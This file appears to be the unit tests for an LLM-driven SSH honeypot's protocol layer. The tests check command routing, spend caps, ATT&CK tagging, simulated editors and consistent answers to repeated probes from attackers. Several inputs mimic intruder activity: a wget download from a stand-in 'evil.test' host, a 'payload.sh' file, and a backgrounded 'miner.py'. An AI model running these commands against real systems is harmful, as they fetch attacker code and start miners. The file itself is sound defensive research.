# SPDX-License-Identifier: BSD-3-Clause

"""Protocol-layer unit tests for the LLM honeypot.

Covers behavior that lives in cowrie/llm/protocol.py: fastpath dispatch
for trivial commands, command-cap enforcement, persona + WorldState
initialization at connectionMade, observation block injection from the
download interceptor, and the marker-leak guard.

Uses the FakeAvatar / FakeServer / FakeTransport fixtures shared with
the shell backend tests, plus a per-test StubLLMClient that returns
canned responses synchronously so we don't need a reactor.
"""

from __future__ import annotations

import time

from twisted.internet import defer
from twisted.trial import unittest

from cowrie.llm import downloader as downloader_mod
from cowrie.llm.protocol import HoneyPotInteractiveProtocol
from cowrie.llm.providers.base import LLMRequest
from cowrie.test.fake_server import FakeAvatar, FakeServer
from cowrie.test.fake_transport import FakeTransport

# ----------------------------------------------------------------------
# Stubs


class StubLLMClient:
    """Minimal LLMClient surface: generate() / get_response() / max_tokens / temperature."""

    def __init__(self, response: str = "ok\n"):
        self.response = response
        self.calls: list[LLMRequest] = []
        self.max_tokens = 500
        self.temperature = 0.7

    def generate(self, request: LLMRequest) -> defer.Deferred:
        self.calls.append(request)
        return defer.succeed(self.response)

    def get_response(self, prompt: list[str]) -> defer.Deferred:
        # legacy path, not exercised by the interactive protocol
        return defer.succeed(self.response)


class _LLMFakeServer(FakeServer):
    """FakeServer that exposes the stub llm_client the protocol expects
    to find on `self.user.server.llm_client`."""

    def __init__(self, llm_client: StubLLMClient):
        super().__init__()
        self.llm_client = llm_client


def _safe_cancel_timeout(proto: HoneyPotInteractiveProtocol) -> None:
    try:
        proto.setTimeout(None)
    except Exception:
        pass


def _disable_fastpath_jitter():
    """Set fastpath_jitter_ms_{min,max} to 0 in CowrieConfig.

    Production defaults to 5-15ms via reactor.callLater. That schedules a
    delayed call that Trial's reactor-cleanliness check rejects unless we
    explicitly cancel it. Disabling jitter at the config level makes the
    tests synchronous without per-test bookkeeping.
    """
    from cowrie.core.config import CowrieConfig
    if not CowrieConfig.has_section("llm"):
        CowrieConfig.add_section("llm")
    CowrieConfig.set("llm", "fastpath_jitter_ms_min", "0")
    CowrieConfig.set("llm", "fastpath_jitter_ms_max", "0")


def _make_protocol(
    *, llm_response: str = "ok\n", source_ip: str = "203.0.113.45",
) -> tuple[HoneyPotInteractiveProtocol, FakeTransport, StubLLMClient]:
    _disable_fastpath_jitter()
    stub = StubLLMClient(response=llm_response)
    avatar = FakeAvatar(_LLMFakeServer(stub))
    proto = HoneyPotInteractiveProtocol(avatar)
    tr = FakeTransport("", "31337")
    proto.makeConnection(tr)
    # Override the realClientIP that connectionMade picked off the
    # FakeTransport's peer — we want deterministic persona selection
    # in the tests.
    proto.realClientIP = source_ip
    tr.clear()
    return proto, tr, stub


# ----------------------------------------------------------------------
# Fastpath


class TestFastpath(unittest.TestCase):

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()

    def tearDown(self) -> None:
        # HoneyPotBaseProtocol.connectionMade arms a TimeoutMixin delayed
        # call; cancel it directly so Trial's reactor-cleanliness check
        # doesn't fail. connectionLost would do this too but throws on
        # the FakeTransport's missing terminal.transport.processEnded.
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_pwd_returns_cwd_without_llm(self):
        self.proto.cwd = "/var/log"
        self.proto.lineReceived(b"pwd")
        self.assertIn(b"/var/log", self.tr.value())
        self.assertEqual(len(self.stub.calls), 0)

    def test_cd_absolute_updates_cwd(self):
        self.proto.lineReceived(b"cd /etc")
        self.assertEqual(self.proto.cwd, "/etc")
        self.assertEqual(len(self.stub.calls), 0)

    def test_cd_tilde_root_goes_to_root_home(self):
        self.proto.lineReceived(b"cd ~")
        self.assertEqual(self.proto.cwd, "/root")

    def test_cd_dotdot_goes_up(self):
        self.proto.cwd = "/var/log"
        self.proto.lineReceived(b"cd ..")
        self.assertEqual(self.proto.cwd, "/var")

    def test_cd_dash_swaps_to_prev(self):
        self.proto.cwd = "/var/log"
        self.proto.lineReceived(b"cd /tmp")
        self.proto.lineReceived(b"cd -")
        self.assertEqual(self.proto.cwd, "/var/log")

    def test_cd_relative_path_appends(self):
        self.proto.cwd = "/var"
        self.proto.lineReceived(b"cd log")
        self.assertEqual(self.proto.cwd, "/var/log")

    def test_empty_input_does_not_call_llm(self):
        self.proto.lineReceived(b"")
        self.assertEqual(len(self.stub.calls), 0)

    def test_clear_invokes_eraseDisplay(self):
        # FakeTransport doesn't implement cursorHome (the real Twisted
        # insults terminal does). Stub it so the fastpath can complete.
        self.tr.cursorHome = lambda: None
        self.proto.lineReceived(b"clear")
        self.assertEqual(len(self.stub.calls), 0)

    def test_show_prompt_defers_when_jitter_configured(self):
        """When jitter > 0, the prompt write must be deferred via
        reactor.callLater rather than synchronous. Verifies the
        anti-fingerprinting jitter is wired correctly."""
        from twisted.internet import reactor as _reactor
        from twisted.internet import task
        clock = task.Clock()
        self.patch(_reactor, "callLater", clock.callLater)
        self.tr.clear()
        self.proto._show_prompt(jitter_min_ms=10, jitter_max_ms=10)
        # Prompt should NOT have been written yet (it's queued).
        self.assertEqual(self.tr.value(), b"")
        clock.advance(0.020)
        # Now the prompt should be there. FakeServer's hostname is "unitTest".
        self.assertIn(b"@unitTest", self.tr.value())

    def test_exit_does_not_call_llm(self):
        # FakeTransport.loseConnection is a noop on StringTransport but
        # the important thing is that the LLM isn't consulted for exit.
        try:
            self.proto.lineReceived(b"exit")
        except Exception:
            pass
        self.assertEqual(len(self.stub.calls), 0)


# ----------------------------------------------------------------------
# Command cap


class TestCommandCap(unittest.TestCase):

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()
        # Override the cap via the CowrieConfig the protocol reads at
        # each turn. The actual config is global, so monkeypatch the
        # protocol method to inject a low cap.
        from cowrie.core.config import CowrieConfig
        # Ensure the [llm] section exists, then set a tight cap.
        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        self._orig_cap = CowrieConfig.get(
            "llm", "max_commands_per_session", fallback=None
        )
        CowrieConfig.set("llm", "max_commands_per_session", "3")
        self.addCleanup(self._restore_cap)

    def _restore_cap(self):
        from cowrie.core.config import CowrieConfig
        if self._orig_cap is None:
            CowrieConfig.remove_option("llm", "max_commands_per_session")
        else:
            CowrieConfig.set("llm", "max_commands_per_session", self._orig_cap)

    def tearDown(self) -> None:
        # HoneyPotBaseProtocol.connectionMade arms a TimeoutMixin delayed
        # call; cancel it directly so Trial's reactor-cleanliness check
        # doesn't fail. connectionLost would do this too but throws on
        # the FakeTransport's missing terminal.transport.processEnded.
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    # A command that always routes to the LLM (cat of an unmodeled file is
    # not in the deterministic responder's table).
    LLM_CMD = b"cat /var/log/auth.log"

    def test_cap_stops_llm_calls_after_threshold(self):
        # 5 LLM-bound commands with cap=3 → provider stub should be
        # called 3 times and the 4th/5th get the canned fork error.
        for _ in range(5):
            self.proto.lineReceived(self.LLM_CMD)
        self.assertEqual(len(self.stub.calls), 3)
        # The 4th and 5th commands should have written the fork error.
        self.assertIn(b"cannot fork", self.tr.value())

    def test_fastpath_commands_do_not_consume_budget(self):
        # 3 LLM commands fill the budget; then 2 fastpath calls should
        # still complete normally without triggering the cap.
        for _ in range(3):
            self.proto.lineReceived(self.LLM_CMD)
        self.assertEqual(len(self.stub.calls), 3)
        self.proto.lineReceived(b"pwd")
        self.proto.lineReceived(b"cd /tmp")
        self.assertEqual(len(self.stub.calls), 3)  # unchanged

    def test_deterministic_commands_do_not_consume_budget(self):
        # Deterministic commands (whoami) never reach the LLM, so they must
        # not count against the per-session LLM budget either.
        for _ in range(10):
            self.proto.lineReceived(b"whoami")
        self.assertEqual(len(self.stub.calls), 0)
        self.assertNotIn(b"cannot fork", self.tr.value())


class TestAttackMapping(unittest.TestCase):
    """The protocol tags commands with MITRE ATT&CK techniques."""

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()
        # Disable the real download interceptor — we only care that the
        # ATT&CK event (emitted before the interceptor) fires; a live treq
        # fetch would dirty the reactor.
        from cowrie.core.config import CowrieConfig
        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        CowrieConfig.set("llm", "capture_downloads", "false")
        self.addCleanup(
            lambda: CowrieConfig.remove_option("llm", "capture_downloads")
        )
        # Capture log.msg calls by patching the protocol module's log ref —
        # narrower and less fragile than a global twisted log observer.
        from cowrie.llm import protocol as protomod
        self._events: list[dict] = []
        self.patch(protomod.log, "msg",  # type: ignore[attr-defined]
                   lambda *a, **k: self._events.append(k))

    def tearDown(self) -> None:
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def _attack_events(self):
        return [e for e in self._events
                if e.get("eventid") == "cowrie.llm.attack"]

    def test_download_command_emits_attack_event(self):
        self.proto.lineReceived(b"wget http://evil.test/x -O /tmp/x")
        evs = self._attack_events()
        self.assertTrue(evs)
        self.assertIn("T1105", evs[-1]["techniques"])

    def test_navigation_emits_no_attack_event(self):
        self.proto.lineReceived(b"cd /tmp")
        self.assertEqual(self._attack_events(), [])

    def test_disabling_mapping_suppresses_event(self):
        from cowrie.core.config import CowrieConfig
        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        CowrieConfig.set("llm", "attack_mapping", "false")
        self.addCleanup(
            lambda: CowrieConfig.remove_option("llm", "attack_mapping")
        )
        self.proto.lineReceived(b"wget http://evil.test/x")
        self.assertEqual(self._attack_events(), [])


# ----------------------------------------------------------------------
# Persona + WorldState init


class TestSessionInit(unittest.TestCase):

    def _make_and_clean(self, **kw):
        proto, tr, stub = _make_protocol(**kw)
        self.addCleanup(lambda: _safe_cancel_timeout(proto))
        return proto, tr, stub

    def test_persona_assigned_at_connectionMade(self):
        proto, _, _ = self._make_and_clean(source_ip="203.0.113.45")
        self.assertTrue(hasattr(proto, "persona"))
        # boot_time must be in the persona's uptime range.
        lo, hi = proto.persona.uptime_days_range
        uptime_days = (time.time() - proto.boot_time) / 86400
        self.assertGreaterEqual(uptime_days, lo)
        self.assertLessEqual(uptime_days, hi + 1)

    def test_same_ip_same_persona(self):
        a, _, _ = self._make_and_clean(source_ip="198.51.100.1")
        b, _, _ = self._make_and_clean(source_ip="198.51.100.1")
        self.assertIs(a.persona, b.persona)

    def test_worldstate_initialized_empty(self):
        proto, _, _ = self._make_and_clean()
        self.assertTrue(hasattr(proto, "world"))
        self.assertEqual(proto.world.files, {})


# ----------------------------------------------------------------------
# Observation block injection from the download interceptor


class TestObservationInjection(unittest.TestCase):

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol(
            llm_response="downloaded ok\n",
        )

    def tearDown(self) -> None:
        # HoneyPotBaseProtocol.connectionMade arms a TimeoutMixin delayed
        # call; cancel it directly so Trial's reactor-cleanliness check
        # doesn't fail. connectionLost would do this too but throws on
        # the FakeTransport's missing terminal.transport.processEnded.
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_download_intercept_injects_observation_into_llm_prompt(self):
        # Stub the downloader so we don't actually fetch anything.
        intent = downloader_mod.DownloadIntent(
            tool="wget",
            url="http://example.test/x",
            outfile="/tmp/x",
            raw_command="wget http://example.test/x -O /tmp/x",
        )
        result = downloader_mod.FetchResult(
            outcome="success",
            url="http://example.test/x",
            saved_to="/tmp/x",
            bytes_downloaded=42,
            sha256="abc1234567890def",
            http_status=200,
            content_type="text/plain",
            duration_seconds=0.1,
        )

        self.patch(downloader_mod, "parse_download_command",
                   lambda line: intent)
        self.patch(downloader_mod, "fetch",
                   lambda i, *, log_event: defer.succeed(result))

        self.proto.lineReceived(b"wget http://example.test/x -O /tmp/x")

        # The LLM was called once with the observation block injected.
        self.assertEqual(len(self.stub.calls), 1)
        req = self.stub.calls[0]
        user_msg = req.messages[-1].content
        self.assertIn("[SHELL_OBSERVED]", user_msg)
        self.assertIn("sha256: abc1234567890def", user_msg)
        self.assertIn("bytes_downloaded: 42", user_msg)
        # And the WorldState picked up the file.
        self.assertIn("/tmp/x", self.proto.world.files)


# ----------------------------------------------------------------------
# Deterministic responder integration


class TestDeterministicPath(unittest.TestCase):

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()

    def tearDown(self) -> None:
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_whoami_renders_without_llm(self):
        self.proto.user.username = "root"
        self.tr.clear()
        self.proto.lineReceived(b"whoami")
        self.assertEqual(len(self.stub.calls), 0)
        self.assertIn(b"root", self.tr.value())

    def test_uname_r_matches_persona(self):
        self.tr.clear()
        self.proto.lineReceived(b"uname -r")
        self.assertEqual(len(self.stub.calls), 0)
        self.assertIn(self.proto.persona.kernel.encode(), self.tr.value())

    def test_disabling_deterministic_routes_to_llm(self):
        from cowrie.core.config import CowrieConfig
        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        CowrieConfig.set("llm", "deterministic_responses", "false")
        self.addCleanup(
            lambda: CowrieConfig.remove_option("llm", "deterministic_responses")
        )
        self.tr.clear()
        self.proto.lineReceived(b"whoami")
        # With the deterministic layer off, whoami goes to the LLM.
        self.assertEqual(len(self.stub.calls), 1)


class TestInteractivePrograms(unittest.TestCase):
    """Full-screen programs take over the terminal and exit on the right key."""

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()

    def tearDown(self) -> None:
        # Ensure no refresh timer is left armed.
        try:
            self.proto._exit_program()
        except Exception:
            pass
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_vi_enters_program_mode(self):
        self.tr.clear()
        self.proto.lineReceived(b"vi /tmp/new.sh")
        self.assertIsNotNone(self.proto._program)
        self.assertEqual(len(self.stub.calls), 0)  # no LLM call
        self.assertIn(b"\x1b[2J", self.tr.value())  # alternate screen
        self.assertIn(b"new.sh", self.tr.value())

    def test_vi_colon_q_exits_to_prompt(self):
        self.proto.lineReceived(b"vi /tmp/x")
        self.assertIsNotNone(self.proto._program)
        self.tr.clear()
        for key in (b":", b"q", b"\r"):
            self.proto.keystrokeReceived(key, None)
        self.assertIsNone(self.proto._program)         # back to shell
        self.assertIn(b"@", self.tr.value())           # prompt redrawn

    def test_top_enters_then_q_exits(self):
        from twisted.internet import reactor as _reactor
        from twisted.internet import task
        clock = task.Clock()
        self.patch(_reactor, "callLater", clock.callLater)
        self.proto.lineReceived(b"top")
        self.assertIsNotNone(self.proto._program)
        self.assertIn(b"load average", self.tr.value())
        self.tr.clear()
        self.proto.keystrokeReceived(b"q", None)
        self.assertIsNone(self.proto._program)

    def test_top_bn1_is_deterministic_not_interactive(self):
        # Batch top is handled by the deterministic responder, NOT program mode.
        self.proto.lineReceived(b"top -bn1")
        self.assertIsNone(self.proto._program)
        self.assertIn(b"%Cpu", self.tr.value())

    def test_keystrokes_in_program_mode_dont_reach_shell(self):
        self.proto.lineReceived(b"vi /tmp/x")
        # A stray 'x' keypress edits the (fake) buffer, not the shell line.
        self.proto.keystrokeReceived(b"x", None)
        self.assertIsNotNone(self.proto._program)  # still in vi

    def test_disabling_interactive_routes_to_llm(self):
        from cowrie.core.config import CowrieConfig
        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        CowrieConfig.set("llm", "interactive_programs", "false")
        self.addCleanup(
            lambda: CowrieConfig.remove_option("llm", "interactive_programs")
        )
        self.proto.lineReceived(b"vi /tmp/x")
        self.assertIsNone(self.proto._program)
        self.assertEqual(len(self.stub.calls), 1)  # went to the LLM

    def test_editor_save_persists_and_cat_reflects_it(self):
        # Full write-through loop: edit a new file in vi, save, then cat it.
        self.proto.user.username = "root"
        self.proto.cwd = "/root"
        self.proto.lineReceived(b"vi /tmp/payload.sh")
        self.assertIsNotNone(self.proto._program)
        for chunk in (b"i", b"echo pwned", b"\x1b"):
            self.proto.keystrokeReceived(chunk, None)
        self.proto.keystrokeReceived(b":wq\r", None)
        self.assertIsNone(self.proto._program)  # back to shell
        # WorldState captured the edit.
        self.assertIn("/tmp/payload.sh", self.proto.world.files)
        self.assertEqual(
            self.proto.world.files["/tmp/payload.sh"].content_snippet,
            "echo pwned",
        )
        # And cat returns exactly what was written — deterministically.
        self.tr.clear()
        self.proto.lineReceived(b"cat /tmp/payload.sh")
        self.assertIn(b"echo pwned", self.tr.value())
        self.assertEqual(len(self.stub.calls), 0)  # no LLM needed


class TestSuFlow(unittest.TestCase):
    """su/sudo changes the effective user, the prompt sigil, and exit pops."""

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()
        self.proto.user.username = "deploy"

    def tearDown(self) -> None:
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_su_root_changes_effective_user_and_prompt(self):
        # su to root: whoami (deterministic) should now say root, and the
        # prompt sigil should flip from $ to #.
        self.proto.lineReceived(b"su -")
        self.assertEqual(self.proto._effective_user(), "root")
        self.tr.clear()
        self.proto.lineReceived(b"whoami")
        self.assertIn(b"root", self.tr.value())
        # Prompt now ends with '# ' (root).
        self.assertIn(b"deploy" if False else b"@", self.tr.value())
        self.assertIn(b"# ", self.tr.value())

    def test_exit_pops_su_then_closes(self):
        self.proto.lineReceived(b"su -")
        self.assertEqual(self.proto._effective_user(), "root")
        # First exit returns to the deploy shell (does not disconnect).
        self.tr.clear()
        self.proto.lineReceived(b"exit")
        self.assertEqual(self.proto._effective_user(), "deploy")
        self.assertIn(b"$ ", self.tr.value())  # back to non-root prompt

    def test_backgrounded_command_recorded_as_process(self):
        # `cmd &` records a process that ps will later reflect.
        self.proto.lineReceived(b"nohup python3 miner.py &")
        cmds = [p.command for p in self.proto.world.processes.values()]
        self.assertIn("python3 miner.py", cmds)


# ----------------------------------------------------------------------
# Marker-leak guard


class TestObservationLeakStrip(unittest.TestCase):

    def test_leaked_marker_stripped_from_terminal_output(self):
        leaky = (
            "before\n"
            "[SHELL_OBSERVED]\nsensitive\n[/SHELL_OBSERVED]\n"
            "after"
        )
        proto, tr, _ = _make_protocol(llm_response=leaky)
        self.addCleanup(lambda: _safe_cancel_timeout(proto))
        # Drive a command that hits the LLM path (ls is not deterministic).
        proto.lineReceived(b"ls -la /var/www")
        rendered = tr.value().decode("utf-8", errors="replace")
        self.assertNotIn("[SHELL_OBSERVED]", rendered)
        self.assertNotIn("[/SHELL_OBSERVED]", rendered)
        self.assertNotIn("sensitive", rendered)


class TestFactLedger(unittest.TestCase):
    """Recording what we already told the attacker, so re-probes agree.

    The threat this addresses: an attacker checking for a honeypot asks the
    same thing twice and compares. Our own FINGERPRINT_PROBE adversary does
    exactly that.
    """

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol(llm_response="Linux h4 6.6.0\n")

    def tearDown(self) -> None:
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def test_deterministic_answer_is_recorded(self):
        self.proto.lineReceived(b"uname -r")
        claim = self.proto.world.claim_for("os.kernel")
        self.assertIsNotNone(claim)
        self.assertEqual(claim.source, "deterministic")

    def test_llm_answer_is_recorded_and_reaches_the_next_prompt(self):
        """The whole point: the second probe must see the first answer.

        `dpkg -l` is not in the emulator's dispatch table, so it reaches
        the model — and it has a fact family (pkg.list), so the answer is
        worth remembering. `apt list --installed` shares that family, which
        is what makes the re-probe detectable at all.
        """
        self.proto.lineReceived(b"dpkg -l")
        claim = self.proto.world.claim_for("pkg.list")
        self.assertIsNotNone(claim, "LLM answer was not recorded")
        self.assertEqual(claim.source, "llm")

        self.proto.lineReceived(b"apt list --installed")
        tail = self.stub.calls[-1].system_blocks[1][0]
        self.assertIn("repeat the same values", tail)
        self.assertIn("pkg.list", tail)

    def test_recorded_excerpt_is_the_redacted_text_the_attacker_saw(self):
        """Not the raw model output — post markdown-strip and post
        leak-redaction, or the ledger would replay something never shown."""
        proto, _tr, _stub = _make_protocol(llm_response="```\nii  bash  5.1\n```")
        self.addCleanup(lambda: proto.setTimeout(None))
        proto.lineReceived(b"dpkg -l")
        claims = [c for c in proto.world.told_facts.values() if c.source == "llm"]
        for claim in claims:
            self.assertNotIn("```", claim.excerpt)

    def test_volatile_commands_are_not_recorded(self):
        """`date` is supposed to change between calls; recording it would
        manufacture a contradiction out of correct behaviour."""
        self.proto.lineReceived(b"date")
        self.assertIsNone(self.proto.world.claim_for("date"))
        self.assertEqual(self.proto.world.told_facts, {})

    def test_a_broken_ledger_never_costs_the_attacker_their_prompt(self):
        """Fault injection — the one that matters.

        An exception on the recording path before the terminal write would
        leave the session with no output and no prompt, hanging until
        interactive_timeout reaps it three minutes later. That is the most
        visible tell this honeypot can produce, so recording is placed
        after the write AND wrapped.
        """
        def explode(**kwargs):
            raise RuntimeError("ledger is broken")

        self.proto.world.record_claim = explode
        self.tr.clear()
        self.proto.lineReceived(b"uname -r")
        output = self.tr.value()
        # The kernel string is persona-dependent, so assert on structure:
        # a non-empty answer landed AND the prompt was drawn.
        self.assertIn(b"#", output, "prompt was not drawn")
        answer = output.split(b"\n")[0].strip()
        self.assertTrue(answer, "no answer was written to the terminal")
        self.flushLoggedErrors()

    def test_disabling_the_ledger_leaves_the_prompt_untouched(self):
        from cowrie.core.config import CowrieConfig

        original = CowrieConfig.get("llm", "fact_ledger", fallback=None)
        CowrieConfig.set("llm", "fact_ledger", "false")
        try:
            self.proto.lineReceived(b"uname -r")
            self.assertEqual(self.proto.world.told_facts, {})
        finally:
            if original is None:
                CowrieConfig.remove_option("llm", "fact_ledger")
            else:
                CowrieConfig.set("llm", "fact_ledger", original)


class TestTokenBudget(unittest.TestCase):
    """Cost bounded by spend, not just by command count.

    max_commands_per_session counts turns; a session of long outputs can
    cost more than two hundred short ones.
    """

    def setUp(self) -> None:
        self.proto, self.tr, self.stub = _make_protocol()

    def tearDown(self) -> None:
        from cowrie.core.config import CowrieConfig

        CowrieConfig.remove_option("llm", "max_tokens_per_session")
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def _set_cap(self, value: str) -> None:
        from cowrie.core.config import CowrieConfig

        if not CowrieConfig.has_section("llm"):
            CowrieConfig.add_section("llm")
        CowrieConfig.set("llm", "max_tokens_per_session", value)

    def test_all_four_buckets_are_summed(self):
        """On Anthropic, total_tokens is input+output only — cache reads
        and writes are separate buckets and excluded from it. Using it
        directly would undercount every cache-warm turn."""
        self.proto._record_usage(
            {
                "input_tokens": 100,
                "output_tokens": 10,
                "cached_tokens": 900,
                "cache_creation_tokens": 50,
                "total_tokens": 110,
            }
        )
        self.assertEqual(self.proto._session_tokens, 1060)

    def test_usage_accumulates_across_turns(self):
        self.proto._record_usage({"input_tokens": 10, "output_tokens": 5})
        self.proto._record_usage({"input_tokens": 20, "output_tokens": 5})
        self.assertEqual(self.proto._session_tokens, 40)

    def test_empty_usage_is_counted_as_unmeasured_not_free(self):
        """A failing provider reports success with an empty usage dict.
        Treating that as zero makes a broken backend look like a cheap
        one, so it is tracked separately."""
        self.proto._record_usage({})
        self.assertEqual(getattr(self.proto, "_session_tokens", 0), 0)
        self.assertEqual(self.proto._turns_without_usage, 1)

    def test_zero_means_unlimited_and_is_the_default(self):
        self.proto._session_tokens = 10**9
        self.assertFalse(self.proto._token_budget_exhausted())

    def test_cap_fires_once_spend_reaches_it(self):
        self._set_cap("1000")
        self.proto._session_tokens = 999
        self.assertFalse(self.proto._token_budget_exhausted())
        self.proto._session_tokens = 1000
        self.assertTrue(self.proto._token_budget_exhausted())

    def test_exhaustion_is_logged_once(self):
        self._set_cap("100")
        self.proto._session_tokens = 500
        self.assertTrue(self.proto._token_budget_exhausted())
        self.assertTrue(self.proto._token_budget_logged)
        # Still exhausted on later turns, but no repeat log line.
        self.assertTrue(self.proto._token_budget_exhausted())

    def test_exhausted_session_degrades_instead_of_disconnecting(self):
        """A plausible resource error keeps the session alive. Hanging up
        abruptly is a far louder tell than a command that failed."""
        self._set_cap("100")
        self.proto._session_tokens = 500
        self.tr.clear()
        self.proto.lineReceived(b"dpkg -l")
        self.assertEqual(len(self.stub.calls), 0, "LLM was called past the cap")
        self.assertIn(b"cannot fork", self.tr.value())
        self.assertIn(b"#", self.tr.value(), "prompt was not drawn")

    def test_deterministic_commands_are_unaffected_by_the_cap(self):
        """Local renders cost nothing, so they must keep working after the
        token budget is gone."""
        self._set_cap("100")
        self.proto._session_tokens = 500
        self.tr.clear()
        self.proto.lineReceived(b"whoami")
        self.assertNotIn(b"cannot fork", self.tr.value())
